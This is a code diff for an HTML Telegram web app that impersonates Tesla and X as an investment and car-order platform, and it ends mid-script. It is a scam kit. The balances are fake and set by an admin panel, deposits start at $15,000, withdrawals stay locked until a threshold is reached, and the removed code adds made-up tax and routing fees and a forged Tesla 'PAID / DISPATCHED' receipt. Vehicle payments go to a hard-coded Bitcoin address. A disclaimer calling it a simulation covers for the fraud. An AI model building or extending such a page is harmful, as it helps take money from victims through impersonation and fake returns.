@@ -4,9 +4,9 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>𝕏-Invest Premium Advisory Matrix</title>
-    <!-- Telegram Web App SDK & Supabase Client -->
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
     <style>
         :root {
             --bg-dark: #000000;
@@ -20,265 +20,253 @@
         }
 
         * { box-sizing: border-box; margin: 0; padding: 0; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; }
-        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; display: flex; flex-direction: column; overflow-x: hidden; }
+        body { background-color: var(--bg-dark); color: var(--text-main); min-height: 100vh; overflow-x: hidden; padding-top: 70px; }
         
-        /* Loading Overlay */
-        .loading-screen { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; background: var(--bg-dark); display: flex; flex-direction: column; justify-content: center; align-items: center; z-index: 9999; transition: opacity 0.4s ease; }
-        .cyber-spinner { width: 45px; height: 45px; border: 2px solid rgba(255, 255, 255, 0.05); border-top: 2px solid var(--tesla-red); border-radius: 50%; animation: spin 0.8s linear infinite; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        /* Fixed Top Header Configuration */
+        header { 
+            background: var(--panel-bg); 
+            padding: 0 20px; 
+            border-bottom: 1px solid var(--border-color); 
+            display: flex; 
+            justify-content: space-between; 
+            align-items: center; 
+            position: fixed; 
+            top: 0; 
+            left: 0;
+            right: 0;
+            height: 60px;
+            z-index: 1000; 
+        }
+        .brand-title { font-weight: 900; letter-spacing: 1px; font-size: 15px; color: #fff; }
+        .balance-box { 
+            background: rgba(255, 255, 255, 0.03); 
+            border: 1px solid var(--border-color); 
+            padding: 6px 14px; 
+            border-radius: 8px; 
+            text-align: right;
+        }
+        .balance-label { font-size: 9px; color: var(--text-gray); text-transform: uppercase; display: block; }
+        .balance-amount { font-size: 15px; font-weight: bold; color: #00ff66; }
 
-        /* Navigation Bar */
-        header { background: var(--panel-bg); padding: 16px 20px; border-bottom: 1px solid var(--border-color); display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 90; }
-        .brand-title { display: flex; align-items: center; gap: 8px; font-weight: 900; letter-spacing: 2px; font-size: 16px; }
-        .badge { font-size: 9px; background: rgba(232, 33, 39, 0.1); color: var(--tesla-red); padding: 4px 10px; border-radius: 4px; font-weight: bold; border: 1px solid rgba(232, 33, 39, 0.2); }
-        
-        /* App View Wrapper */
-        .app-view { display: none; padding: 20px; flex-direction: column; gap: 20px; width: 100%; max-width: 800px; margin: 0 auto 80px auto; }
-        .app-view.active { display: flex; }
+        /* 3-Line Hamburger Button Menu Button */
+        .menu-toggle {
+            position: fixed;
+            top: 80px;
+            left: 20px;
+            background: #111115;
+            border: 1px solid var(--border-color);
+            border-radius: 8px;
+            padding: 12px;
+            cursor: pointer;
+            z-index: 900;
+            display: flex;
+            flex-direction: column;
+            gap: 5px;
+        }
+        .menu-toggle .bar { width: 20px; height: 2px; background-color: #fff; transition: 0.3s; }
 
-        /* Premium Dashboard Widgets */
-        .main-card { background: linear-gradient(135deg, #0d0d11, #181822); border: 1px solid var(--border-color); border-radius: 16px; padding: 28px; text-align: center; box-shadow: var(--glow-red); }
-        .tesla-logo-svg { height: 32px; margin: 0 auto 12px auto; display: block; filter: drop-shadow(0 0 8px var(--tesla-red)); }
-        .balance-display { font-size: 42px; font-weight: 800; letter-spacing: -1px; margin-top: 6px; }
-        
-        /* Nav Menu Bar */
-        .nav-menu { position: fixed; bottom: 0; left: 0; width: 100%; background: var(--panel-bg); border-top: 1px solid var(--border-color); display: flex; justify-content: space-around; padding: 12px 0; z-index: 100; }
-        .nav-item { color: var(--text-gray); font-size: 11px; text-decoration: none; cursor: pointer; font-weight: bold; display: flex; flex-direction: column; align-items: center; gap: 4px; user-select: none; }
-        .nav-item.active { color: var(--text-main); text-shadow: 0 0 10px #ffffff; }
+        /* Hidden Drawer Side Navigation Panel */
+        .side-nav {
+            position: fixed;
+            top: 0;
+            left: -280px;
+            width: 260px;
+            height: 100%;
+            background: #0b0b0e;
+            border-right: 1px solid var(--border-color);
+            box-shadow: 10px 0 30px rgba(0,0,0,0.7);
+            transition: transform 0.3s ease-in-out;
+            z-index: 950;
+            padding: 140px 20px 20px 20px;
+        }
+        .side-nav.open { transform: translateX(280px); }
+        .nav-links { list-style: none; display: flex; flex-direction: column; gap: 12px; }
+        .nav-item { 
+            display: flex; 
+            align-items: center; 
+            gap: 12px; 
+            color: var(--text-gray); 
+            text-decoration: none; 
+            font-size: 14px; 
+            font-weight: 600;
+            padding: 12px; 
+            border-radius: 8px; 
+            border: 1px solid transparent;
+        }
+        .nav-item:hover, .nav-item.active { 
+            background: rgba(232, 33, 39, 0.08); 
+            color: #fff; 
+            border-color: rgba(232, 33, 39, 0.2); 
+        }
 
-        /* System Buttons & Input Form elements */
-        .btn { background: #ffffff; color: #000000; border: none; padding: 14px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; transition: all 0.2s; font-size: 14px; text-align: center; text-transform: uppercase; letter-spacing: 1px; }
-        .btn-tesla { background: var(--tesla-red); color: #ffffff; }
-        .btn-tesla:hover { background: #ff2a31; box-shadow: var(--glow-red); }
-        .btn:disabled { background: #333 !important; color: #777 !important; cursor: not-allowed; box-shadow: none !important; }
+        /* View Layout Handling Container */
+        .app-view { display: none; padding: 20px; width: 100%; max-width: 600px; margin: 60px auto 40px auto; }
+        .app-view.active { display: flex; flex-direction: column; gap: 20px; }
+
+        /* General Forms and Inputs elements formatting */
+        .card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 14px; padding: 20px; width: 100%; }
+        .btn { background: var(--tesla-red); color: #fff; border: none; padding: 14px; border-radius: 8px; font-weight: bold; width: 100%; cursor: pointer; text-transform: uppercase; font-size: 13px; letter-spacing: 0.5px; }
+        .btn:hover { background: #ff2a31; box-shadow: var(--glow-red); }
         
-        .input-group { display: flex; flex-direction: column; gap: 8px; width: 100%; text-align: left; margin-bottom: 16px; }
-        .input-group label { font-size: 11px; color: var(--text-gray); text-transform: uppercase; letter-spacing: 1px; font-weight: bold; }
-        .input-field { background: var(--card-bg); border: 1px solid var(--border-color); padding: 14px; border-radius: 8px; color: #fff; font-size: 14px; width: 100%; outline: none; }
+        .input-group { display: flex; flex-direction: column; gap: 8px; margin-bottom: 16px; width: 100%; }
+        .input-group label { font-size: 11px; color: var(--text-gray); text-transform: uppercase; font-weight: bold; }
+        .input-field { background: #16161f; border: 1px solid var(--border-color); padding: 14px; border-radius: 8px; color: #fff; font-size: 14px; width: 100%; outline: none; }
         .input-field:focus { border-color: var(--tesla-red); }
-        
-        /* Info Cards & Grids */
-        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
-        .card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; padding: 18px; }
-        
-        /* TradingView Integration Wrapper */
-        .chart-container { width: 100%; height: 350px; background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 12px; overflow: hidden; margin-top: 10px; }
-        
-        /* Product Items Showcase */
-        .product-grid { display: flex; flex-direction: column; gap: 16px; }
-        .product-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 14px; overflow: hidden; display: flex; flex-direction: column; transition: border-color 0.2s; }
-        .product-card:hover { border-color: var(--tesla-red); }
-        .product-img-box { width: 100%; height: 220px; background-size: cover; background-position: center; background-color: #1a1a24; }
-        .product-details { padding: 16px; display: flex; flex-direction: column; gap: 8px; }
-        .product-price { font-size: 20px; font-weight: 800; color: var(--tesla-red); }
 
-        /* Premium Graphic Frame */
-        .elon-hero-card { background: linear-gradient(rgba(0,0,0,0.85), rgba(0,0,0,0.85)), url('https://i.ibb.co/6wY36Vf/elon-presentation.jpg') center/cover no-repeat; border: 1px solid var(--border-color); border-radius: 14px; padding: 20px; text-align: center; }
+        /* Store Products Display Framework */
+        .product-card { background: var(--card-bg); border: 1px solid var(--border-color); border-radius: 14px; overflow: hidden; margin-bottom: 20px; }
+        .product-img { width: 100%; height: 200px; background-size: cover; background-position: center; background-color: #15151c; }
+        .product-info { padding: 18px; }
+        .product-price { font-size: 22px; font-weight: bold; color: var(--tesla-red); margin: 10px 0; }
 
-        /* Dynamic QR Code Framework */
-        .qr-wrapper { max-width: 260px; background: #16161a; border: 1px solid var(--border-color); border-radius: 12px; padding: 16px; margin: 15px auto; text-align: center; }
-        .qr-image { width: 100%; border-radius: 6px; display: block; margin-bottom: 12px; }
-        .address-box { font-family: monospace; font-size: 10px; word-break: break-all; background: #000; padding: 10px; border-radius: 6px; color: #ff9900; border: 1px solid rgba(255,153,0,0.2); user-select: all; }
-
-        /* Document Slip Element Stylings */
-        .receipt-slip { background: #ffffff; color: #000000; border-radius: 4px; padding: 24px; font-family: "Courier New", Courier, monospace; box-shadow: 0 10px 30px rgba(0,0,0,0.5); margin-top: 20px; position: relative; display: none; }
-        .receipt-slip::before { content: ""; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: linear-gradient(90deg, #000 50%, transparent 50%) top/10px 4px repeat-x; }
-        .receipt-header { text-align: center; margin-bottom: 20px; border-bottom: 1px dashed #000; padding-bottom: 10px; }
-        .receipt-row { display: flex; justify-content: space-between; font-size: 13px; margin-bottom: 6px; }
-        
-        /* Global Layout Branding Footer */
-        .sponsor-flag { text-align: center; color: var(--text-gray); font-size: 11px; font-weight: bold; letter-spacing: 2px; margin: 30px 0 10px 0; text-transform: uppercase; }
+        /* QR Module Frame styling */
+        .qr-container-wrapper { display: flex; flex-direction: column; align-items: center; margin: 15px 0; background: #fff; padding: 15px; border-radius: 12px; width: fit-content; margin-left: auto; margin-right: auto; }
+        .address-box { font-family: monospace; font-size: 10px; word-break: break-all; background: #000; padding: 10px; border-radius: 6px; color: #ff9900; border: 1px solid rgba(255,153,0,0.2); width: 100%; text-align: center; margin-top: 10px; }
     </style>
 </head>
 <body>
 
-    <!-- Space-X / Tesla Futuristic Loader Layer -->
-    <div id="loading-screen" class="loading-screen">
-        <div style="font-size: 40px; font-weight: bold; margin-bottom: 15px;">𝕏</div>
-        <div class="cyber-spinner"></div>
-        <p style="color: var(--text-gray); font-size: 10px; margin-top: 20px; letter-spacing: 2px;">SYNCHRONIZING REAL TIME MATRICES...</p>
-    </div>
-
-    <!-- Live Header Navigation View -->
     <header>
-        <div class="brand-title"><span>𝕏</span> INVEST GLOBAL</div>
-        <div id="user-display" class="badge">SECURE MATRIX ENGINE</div>
+        <div class="brand-title" id="user-display">@NEURALLINKTRADER</div>
+        <div class="balance-box">
+            <span class="balance-label">Portfolio Balance</span>
+            <div id="balance" class="balance-amount">$0.00</div>
+        </div>
     </header>
 
-    <!-- VIEW 1: MAIN ADVANCED PORTFOLIO DASHBOARD -->
+    <button class="menu-toggle" id="menuToggle">
+        <div class="bar"></div>
+        <div class="bar"></div>
+        <div class="bar"></div>
+    </button>
+
+    <nav class="side-nav" id="sideNav">
+        <ul class="nav-links">
+            <li><a href="#" class="nav-item active" onclick="switchView('view-dashboard', this)"><span>📊</span> Dashboard Matrix</a></li>
+            <li><a href="#" class="nav-item" onclick="switchView('view-store', this)"><span>🚘</span> Tesla Fleet Products</a></li>
+            <li><a href="#" class="nav-item" onclick="switchView('view-withdraw', this)"><span>💸</span> Disinvestment Clearings</a></li>
+            <li><a href="#" class="nav-item" onclick="switchView('view-admin', this)"><span>⚙️</span> Administration Core</a></li>
+        </ul>
+    </nav>
+
     <main id="view-dashboard" class="app-view active">
-        <div class="main-card">
-            <img class="tesla-logo-svg" src="https://svgshare.com/i/157G.svg" alt="Tesla Logo">
-            <p style="color: var(--text-gray); font-size: 10px; letter-spacing: 2px; text-transform: uppercase;">MONITORED TSLA PORTFOLIO VALUE</p>
-            <div id="balance" class="balance-display">$0.00</div>
-            <p style="color: #00ff66; font-size: 12px; margin-top: 5px; font-weight: bold;">Live Price: $404.87 USD</p>
+        <div class="card" style="text-align: center; background: linear-gradient(135deg, #0f0f14, #1b1b26);">
+            <p style="font-size: 11px; letter-spacing: 1px; color: var(--text-gray);">MARKET VALUATION SYNC STATUS</p>
+            <h2 style="font-size: 28px; margin-top: 5px;">TSLA Live Feed: $404.87</h2>
+            <div id="tradingview_chart" style="height: 280px; width:100%; margin-top: 15px; border-radius: 8px; background: #000; border: 1px solid var(--border-color);"></div>
         </div>
 
-        <div class="card" style="border-left: 3px solid var(--tesla-red);">
-            <h4 style="margin-bottom: 10px; font-size: 14px;">⚡ INSTANT STOCK ACQUISITION CHANNEL</h4>
-            <div class="input-group" style="margin-bottom: 12px;">
-                <label>Allocation Capital Volume ($)</label>
-                <input type="number" id="stock-purchase-amount" class="input-field" placeholder="Ex: 15000" min="15000">
-                <small style="color: var(--text-gray); font-size: 11px; margin-top: 4px;">* Note: System Min: $15,000 / Maximum structural limit: $30,000 per rolling 3-hour frame.</small>
+        <div class="card">
+            <h3 style="margin-bottom: 12px; font-size: 15px;">⚡ ACCELERATED PORTFOLIO STAKE ALLOCATION</h3>
+            <div class="input-group">
+                <label>Allocation Value Threshold ($)</label>
+                <input type="number" id="stock-purchase-amount" class="input-field" placeholder="Ex: 15000">
+                <small style="color: var(--text-gray); font-size: 11px; margin-top: 4px;">* System Minimum Limit: $15,000 / Maximum rolling window ceiling: $30,000.</small>
             </div>
-            <button class="btn btn-tesla" onclick="executeStockPurchase()">Execute Asset Deployment Order</button>
+            <button class="btn" onclick="executeStockPurchase()">Execute Asset Deployment Order</button>
         </div>
 
-        <h3>Live NASDAQ:TSLA Market Feed</h3>
-        <div class="chart-container">
-            <div id="tradingview_chart" style="height: 100%;"></div>
+        <div class="card" style="margin-top: 10px; border-top: 3px solid var(--text-gray); max-height: 180px; overflow-y: scroll; background: #0b0b0e; padding: 15px; border-radius: 8px;">
+            <h4 style="font-size: 11px; letter-spacing: 1px; margin-bottom: 8px; color: var(--text-main); text-transform: uppercase;">End-User License Agreement & Operational Disclosures</h4>
+            
+            <p style="font-size: 11px; color: var(--text-gray); line-height: 1.5; margin-bottom: 10px;">
+                <strong>1. Scope of License:</strong> This application grants you a non-exclusive, non-transferable, revocable license to access premium simulation matrices, mock ledger allocation testing suites, and integrated analytical tracking software strictly for educational, engineering, and interface testing benchmarks. All virtual assets, portfolio data calculations, and simulated balance points visible within this dashboard environment are dynamically generated telemetry records and do not constitute legal brokerage accounts or registered financial holding deposits.
+            </p>
+
+            <p style="font-size: 11px; color: var(--text-gray); line-height: 1.5; margin-bottom: 10px;">
+                <strong>2. No Financial or Investment Advice:</strong> The market data feeds presented herein (including interactive charts detailing ticker performance) are pulled via public web APIs for layout validation and visual synthesis. No tracking signals, calculations, or platform scripts should be interpreted as professional financial advisory services, certified stock trading instructions, or vehicle purchase contracts. 
+            </p>
+
+            <p style="font-size: 11px; color: var(--text-gray); line-height: 1.5; margin-bottom: 10px;">
+                <strong>3. Operational Constraints & External Integrations:</strong> Users acknowledge that data synchronization depends entirely on independent backend parameters provided via your standalone database infrastructure. The system administrators retain absolute rights to reset allocation time-windows, flush cached ledger telemetry tables, and calibrate localized pricing arrays to preserve system integrity without prior notification.
+            </p>
+
+            <p style="font-size: 11px; color: var(--text-gray); line-height: 1.5;">
+                <strong>4. Asset Procurement Disclaimers:</strong> Any direct interactions with store listings, order receipts, or secure transaction addresses represent independent protocol paths executed entirely at the user's discretion. Users remain fully responsible for confirming local regulatory compliance regarding digital network parameters and payment processing endpoints before broadcasting order transactions.
+            </p>
         </div>
     </main>
 
-    <!-- VIEW 2: SECURE CASH OUT / WITHDRAW TERMINAL -->
-    <main id="view-withdraw" class="app-view">
-        <h2>Capital Disinvestment Matrix</h2>
-        <p style="color: var(--text-gray); font-size: 13px;">Secure network clearance module to off-ramp integrated valuation limits to physical accounts.</p>
-        
-        <div id="withdraw-restricted-notice" class="card" style="text-align: center; border: 1px dashed var(--tesla-red);">
-            <p style="color: var(--tesla-red); font-weight: bold; margin-bottom: 6px;">🚫 ACCESS RESTRICTED</p>
-            <p style="font-size: 13px; color: var(--text-gray);">Disinvestment features initialize only when your verified holding valuation hits an active balance of a minimum **$10,000.00**.</p>
-        </div>
-
-        <div id="withdraw-active-form" class="card" style="display: none;">
-            <div class="input-group">
-                <label>Withdrawal Destination Protocol</label>
-                <input type="text" id="withdraw-destination" class="input-field" placeholder="Ex: Bank Routing, Wire Profile, or Wallet Identifier">
-            </div>
-            <div class="input-group">
-                <label>Requested Disinvestment Asset Value ($)</label>
-                <input type="number" id="withdraw-amount" class="input-field" placeholder="0.00" oninput="calculateWithdrawalFees()">
-            </div>
-            
-            <div style="background: rgba(0,0,0,0.4); padding: 14px; border-radius: 8px; margin-bottom: 16px; border: 1px solid var(--border-color); font-size: 13px; display: flex; flex-direction: column; gap: 6px;">
-                <div style="display: flex; justify-content: space-between;"><span>Legal Statutory Tax withholding (5%):</span><span id="tax-display" style="color: var(--tesla-red); font-weight: bold;">$0.00</span></div>
-                <div style="display: flex; justify-content: space-between;"><span>Variable Platform Routing Fee:</span><span id="fee-display" style="color: var(--tesla-red); font-weight: bold;">$0.00</span></div>
-                <hr style="border: 0; border-top: 1px solid var(--border-color); margin: 4px 0;">
-                <div style="display: flex; justify-content: space-between; font-weight: bold;"><span>Net Disbursed Capital Balance:</span><span id="net-payout-display" style="color: #00ff66;">$0.00</span></div>
-            </div>
-            
-            <button class="btn btn-tesla" onclick="executeWithdrawalRequest()">Transmit Clearance Settlement</button>
-        </div>
-    </main>
-
-    <!-- VIEW 3: TESLA FACTORY ASSET SHOWCASE STORE -->
     <main id="view-store" class="app-view">
-        <h2>Tesla Logistics Fleet Orders</h2>
-        <p style="color: var(--text-gray); font-size: 13px; margin-bottom: 5px;">Direct acquisition matrix showing verified production models and active MSRP structures.</p>
+        <h2 style="margin-bottom: 5px;">Tesla Direct Logistics Fleet</h2>
+        <p style="color: var(--text-gray); font-size: 13px; margin-bottom: 20px;">Deploy integrated platform balances into active factory vehicle delivery queues.</p>
         
-        <div class="product-grid">
-            <!-- Product 1 -->
+        <div id="products-catalog-container">
             <div class="product-card">
-                <div class="product-img-box" style="background-image: url('https://images.unsplash.com/photo-1619767886558-efdc259cde1a?auto=format&fit=crop&w=800&q=80');"></div>
-                <div class="product-details">
-                    <h3>Tesla Model 3 (Standard Range RWD)</h3>
-                    <p style="font-size: 12px; color: var(--text-gray);">The highly optimized premium sports sedan variant. Configured with a single rear-wheel-drive motor providing up to 321 miles of estimated range.</p>
+                <div class="product-img" style="background-image: url('https://images.unsplash.com/photo-1619767886558-efdc259cde1a?auto=format&fit=crop&w=800&q=80');"></div>
+                <div class="product-info">
+                    <h3>Tesla Model 3</h3>
+                    <p style="font-size: 12px; color: var(--text-gray); margin-top: 5px;">Premium configurations optimized with standard dual-motor mechanical drive, long range capabilities, and upgraded glass design.</p>
                     <div class="product-price">$36,990</div>
-                    <button class="btn btn-tesla" onclick="initiateVehicleOrder('Tesla Model 3 RWD', 36990)">Initialize Vehicle Purchase</button>
+                    <button class="btn" onclick="openOrderModal('Tesla Model 3', 36990)">Initialize Delivery Matrix</button>
                 </div>
             </div>
-            <!-- Product 2 -->
+
             <div class="product-card">
-                <div class="product-img-box" style="background-image: url('https://images.unsplash.com/photo-1619551483344-0de91f5798c8?auto=format&fit=crop&w=800&q=80');"></div>
-                <div class="product-details">
-                    <h3>Tesla Model Y (Standard Range RWD)</h3>
-                    <p style="font-size: 12px; color: var(--text-gray);">Tesla's hyper-popular midsize utility vehicle platform. Engineered with 321 miles of pure electric efficiency and standard glass panoramic styling.</p>
+                <div class="product-img" style="background-image: url('https://images.unsplash.com/photo-1619551483344-0de91f5798c8?auto=format&fit=crop&w=800&q=80');"></div>
+                <div class="product-info">
+                    <h3>Tesla Model Y</h3>
+                    <p style="font-size: 12px; color: var(--text-gray); margin-top: 5px;">Advanced midsize utility structure engineered with versatile seating cargo, high-efficiency range, and automated driving setup.</p>
                     <div class="product-price">$39,990</div>
-                    <button class="btn btn-tesla" onclick="initiateVehicleOrder('Tesla Model Y RWD', 39990)">Initialize Vehicle Purchase</button>
+                    <button class="btn" onclick="openOrderModal('Tesla Model Y', 39990)">Initialize Delivery Matrix</button>
                 </div>
             </div>
-            <!-- Product 3 -->
+
             <div class="product-card">
-                <div class="product-img-box" style="background-image: url('https://images.unsplash.com/photo-1617788138017-80ad40651399?auto=format&fit=crop&w=800&q=80');"></div>
-                <div class="product-details">
-                    <h3>Tesla Model S (Dual Motor AWD)</h3>
-                    <p style="font-size: 12px; color: var(--text-gray);">Premium full-size legacy sedan pushing a commanding 670 horsepower from its dual-motor setup, mapping a long-distance 410-mile operational range.</p>
-                    <div class="product-price">$94,990</div>
-                    <button class="btn btn-tesla" onclick="initiateVehicleOrder('Tesla Model S AWD', 94990)">Initialize Vehicle Purchase</button>
-                </div>
-            </div>
-            <!-- Product 4 -->
-            <div class="product-card">
-                <div class="product-img-box" style="background-image: url('https://images.unsplash.com/photo-1563720223185-11003d516935?auto=format&fit=crop&w=800&q=80');"></div>
-                <div class="product-details">
-                    <h3>Tesla Model X (Dual Motor AWD)</h3>
-                    <p style="font-size: 12px; color: var(--text-gray);">The flagship smart luxury utility vehicle featuring iconic automated Falcon Wing entry profiles and an independent torque-vectoring dual-motor platform.</p>
-                    <div class="product-price">$99,990</div>
-                    <button class="btn btn-tesla" onclick="initiateVehicleOrder('Tesla Model X AWD', 99990)">Initialize Vehicle Purchase</button>
-                </div>
-            </div>
-            <!-- Product 5 -->
-            <div class="product-card">
-                <div class="product-img-box" style="background-image: url('https://images.unsplash.com/photo-1695668417643-415849be5c3b?auto=format&fit=crop&w=800&q=80');"></div>
-                <div class="product-details">
-                    <h3>Tesla Cybertruck (Dual Motor AWD)</h3>
-                    <p style="font-size: 12px; color: var(--text-gray);">Ultra-hard 30X cold-rolled stainless-steel exoskeleton framing combined with variable adaptive air suspension mechanics and a 325-mile capability threshold.</p>
+                <div class="product-img" style="background-image: url('https://images.unsplash.com/photo-1695668417643-415849be5c3b?auto=format&fit=crop&w=800&q=80');"></div>
+                <div class="product-info">
+                    <h3>Tesla Cybertruck</h3>
+                    <p style="font-size: 12px; color: var(--text-gray); margin-top: 5px;">Ultra-hard 30X cold-rolled steel design frame, equipped with multi-terrain mechanical suspension and multi-motor utility.</p>
                     <div class="product-price">$79,990</div>
-                    <button class="btn btn-tesla" onclick="initiateVehicleOrder('Tesla Cybertruck AWD', 79990)">Initialize Vehicle Purchase</button>
+                    <button class="btn" onclick="openOrderModal('Tesla Cybertruck', 79990)">Initialize Delivery Matrix</button>
                 </div>
             </div>
         </div>
 
-        <!-- Vehicle Order Form Modular Section -->
-        <div id="order-form-container" class="elon-hero-card" style="display: none; margin-top: 15px;">
-            <h3 id="order-form-title" style="color: var(--text-main); text-shadow: 0 2px 4px rgba(0,0,0,0.8); margin-bottom: 12px;"></h3>
+        <div id="order-form-block" class="card" style="display: none; border-color: var(--tesla-red);">
+            <h3 id="order-title-element" style="margin-bottom: 15px;"></h3>
             
             <div class="input-group">
-                <label>Preferred Settlement Protocol</label>
-                <select id="order-payment-method" class="input-field" onchange="adjustOrderPaymentUI()">
-                    <option value="balance">Deduct From Matrix Account Balance</option>
-                    <option value="qr">Generate Secure Payment QR Gateway</option>
+                <label>Clearance Resolution Protocol</label>
+                <select id="payment-mode-selection" class="input-field" onchange="togglePaymentSelectionUI()">
+                    <option value="balance">Deduct Asset Value From Platform Portfolio Balance</option>
+                    <option value="qr">Generate Secure Payment QR Gateway Link</option>
                 </select>
             </div>
 
-            <!-- Dynamic Live BTC QR Payment Gateway Component -->
-            <div id="order-qr-block" style="display: none; margin-bottom: 16px;">
-                <p style="font-size: 11px; color: #ff9900; font-weight: bold; margin-bottom: 6px; text-transform: uppercase;">⚠️ Send Only Bitcoin (BTC) To This Address</p>
-                <div class="qr-wrapper">
-                    <img class="qr-image" src="https://i.ibb.co/L5wCr3c/btc-qr.jpg" alt="Secure BTC QR Code">
-                    <div class="address-box">bc1q8egcghdp55c4p54rnw7v4zjwupme7m3se509tw</div>
+            <div id="qr-gateway-display-box" style="display: none; text-align: center; margin-bottom: 15px;">
+                <p style="color: #ff9900; font-size: 11px; font-weight: bold; margin-bottom: 8px;">⚠️ SECURE ROUTING SYSTEM: DEPOSIT ONLY CRYPTO ASSETS</p>
+                <div class="qr-container-wrapper">
+                    <div id="qrcode-target"></div>
                 </div>
+                <div class="address-box">bc1q8egcghdp55c4p54rnw7v4zjwupme7m3se509tw</div>
             </div>
 
             <div class="input-group">
-                <label>Physical Shipping Destination Delivery Address</label>
-                <input type="text" id="order-shipping-location" class="input-field" placeholder="Enter clean operational street address & country destination">
+                <label>Physical Street Shipping Destination Delivery Address</label>
+                <input type="text" id="order-address-input" class="input-field" placeholder="Complete destination tracking lines">
             </div>
 
-            <button class="btn btn-tesla" onclick="submitVehiclePurchase()">Authorize Delivery Order</button>
-        </div>
-
-        <!-- PRINTABLE CAR PURCHASE RECEIPT MATRIX SLIP -->
-        <div id="purchase-slip" class="receipt-slip">
-            <div class="receipt-header">
-                <h2 style="font-size: 18px; letter-spacing: 1px; color:#000;">TESLA MOTOR CO.</h2>
-                <p style="font-size: 10px; margin-top: 4px; color:#333;">GLOBAL DIRECT LOGISTICS FULFILLMENT SLIP</p>
-            </div>
-            <div class="receipt-row"><span>DOCUMENT TYPE:</span><strong>OFFICIAL ASSET PURCHASE SLIP</strong></div>
-            <div class="receipt-row"><span>ORDER REGISTER ID:</span><span id="slip-order-id"></span></div>
-            <div class="receipt-row"><span>TIMESTAMP SYNC:</span><span id="slip-time"></span></div>
-            <div class="receipt-row"><span>BUYER TELEGRAM ID:</span><span id="slip-buyer-id"></span></div>
-            <div style="border-bottom: 1px dashed #000; margin: 12px 0;"></div>
-            <div class="receipt-row"><strong>VEHICLE DESC:</strong><strong id="slip-item-name"></strong></div>
-            <div class="receipt-row"><span>CLEARANCE STATUS:</span><strong>[ PAID / DISPATCHED ]</strong></div>
-            <div class="receipt-row"><span>SETTLEMENT NODE:</span><span id="slip-pay-method"></span></div>
-            <div style="border-bottom: 1px dashed #000; margin: 12px 0;"></div>
-            <div class="receipt-row" style="font-size: 11px;"><span>SHIPPING DESTINATION LOCATION:</span></div>
-            <p id="slip-location" style="font-size: 12px; font-weight: bold; margin: 4px 0 12px 0; background: #eee; padding: 6px; border-radius: 4px;"></p>
-            <div class="receipt-row" style="font-size: 16px; font-weight: bold; margin-top: 10px;"><span>TOTAL PRICE</span><span id="slip-price"></span></div>
-            <div style="border-bottom: 1px dashed #000; margin: 12px 0;"></div>
-            <p style="font-size: 9px; text-align: center; color: #444; line-height: 1.3;">Your shipment clearance files have been automatically verified. This slip represents functional production configurations registered directly with administration ID node 7564351203.</p>
+            <button class="btn" onclick="submitVehicleOrder()">Authorize Delivery Orders</button>
         </div>
     </main>
 
-    <!-- CORE ADMIN ENGINE MATRIX -->
+    <main id="view-withdraw" class="app-view">
+        <h2>Capital Disinvestment Clearance Terminal</h2>
+        <p style="color: var(--text-gray); font-size: 13px; margin-bottom: 15px;">Convert dynamic equity ledger assets into physical external accounts.</p>
+        
+        <div id="withdraw-lockout-notice" class="card" style="text-align: center; border-style: dashed; border-color: var(--tesla-red);">
+            <p style="color: var(--tesla-red); font-weight: bold; margin-bottom: 4px;">🚫 SYSTEM STATUS: ACCESS LOCKED</p>
+            <p style="font-size: 12px; color: var(--text-gray);">Withdrawal routing modules initialize only when individual verified portfolio limits cross a baseline of **$10,000.00**.</p>
+        </div>
+    </main>
+
     <main id="view-admin" class="app-view">
         <h2>Admin Management Matrix Panel</h2>
-        <p style="color: var(--tesla-red); font-size: 11px; font-weight: bold; letter-spacing: 1px; text-transform: uppercase; margin-bottom: 5px;">Core Level Validation Verified</p>
         <p style="color: var(--text-gray); font-size: 12px; margin-bottom: 15px;">Operational Hub Anchor: Gigafactory — Austin, Texas, USA</p>
         
         <div class="card">
-            <h4 style="margin-bottom: 12px;">Manual Account Balance Controller</h4>
+            <h4 style="margin-bottom: 12px; font-size: 14px;">Manual Account Balance Controller</h4>
             <div class="input-group">
                 <label>Target User Telegram ID Number</label>
                 <input type="text" id="admin-target-id" class="input-field" placeholder="Ex: 12345678">
@@ -287,358 +275,191 @@
                 <label>New Exact Portfolio Balance Amount ($)</label>
                 <input type="number" id="admin-target-balance" class="input-field" placeholder="Ex: 50000">
             </div>
-            <button class="btn btn-tesla" onclick="adminUpdateBalance()">Sync Modified Balance Instantly</button>
+            <button class="btn" onclick="adminUpdateBalance()">Sync Modified Balance Instantly</button>
         </div>
     </main>
 
-    <div class="sponsor-flag">Sponsored by 𝕏</div>
-
-    <!-- Persistent App Footer Menu Nav Interface -->
-    <nav class="nav-menu">
-        <div class="nav-item active" onclick="switchView('view-dashboard', this)"><span>📊</span>Dashboard</div>
-        <div class="nav-item" onclick="switchView('view-withdraw', this)"><span>💸</span>Withdraw</div>
-        <div class="nav-item" onclick="switchView('view-store', this)"><span>🚘</span>Tesla Store</div>
-        <div id="admin-nav" class="nav-item" style="display: none;" onclick="switchView('view-admin', this)"><span>⚙️</span>Admin Core</div>
-    </nav>
-
     <script>
-        // CORE PLATFORM CONNECTIVITY TELEMETRY PIPELINES
+        // BACKEND CONTROL TELEMETRY CONNECTORS
         const SUPABASE_URL = "https://uexsmqsplhdxkq.supabase.co";
